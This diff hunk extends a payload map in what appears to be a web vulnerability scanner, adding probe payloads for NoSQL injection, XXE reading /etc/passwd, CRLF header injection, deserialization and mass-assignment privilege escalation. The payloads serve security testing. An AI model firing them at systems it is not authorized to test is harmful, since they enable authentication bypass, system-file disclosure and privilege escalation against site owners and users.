@@ -41,6 +41,34 @@ _SMART_PAYLOAD_MAP = {
                   "preview", "display", "expression", "eval"],
         "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}"],
     },
+    "nosql": {
+        "names": ["username", "password", "email", "login", "user", "pass", "filter",
+                  "where", "sort", "order", "populate", "select"],
+        "payloads": ['{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}', "' || 'a'=='a", "admin' || ''=='"],
+    },
+    "xxe": {
+        "names": ["xml", "data", "soap", "payload", "content", "body", "feed", "rss", "wsdl"],
+        "payloads": ['<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]><f>&x;</f>',
+                     '<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/hostname">]><f>&x;</f>'],
+    },
+    "crlf": {
+        "names": ["url", "redirect", "return", "next", "goto", "dest", "host", "header",
+                  "ref", "referer", "origin", "location"],
+        "payloads": ["%0d%0aX-Injected: true", "%0d%0aSet-Cookie: evil=true",
+                     "%0d%0a%0d%0a<script>alert(1)</script>", "\\r\\nX-Injected: true"],
+    },
+    "deserialization": {
+        "names": ["data", "object", "payload", "token", "session", "viewstate", "state",
+                  "serialized"],
+        "payloads": ['O:8:"stdClass":0:{}', "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==",
+                     '{"rce":"_$$ND_FUNC$$_function(){return 1}()"}', 'a:1:{s:4:"test";s:4:"test";}'],
+    },
+    "mass_assignment": {
+        "names": ["role", "admin", "is_admin", "privilege", "permission", "group", "level",
+                  "verified", "active", "approved", "is_staff", "credits", "balance", "plan"],
+        "payloads": ['{"role":"admin"}', '{"is_admin":true}', '{"price":0}',
+                     '{"discount":100}', '{"verified":true}'],
+    },
 }
 
 
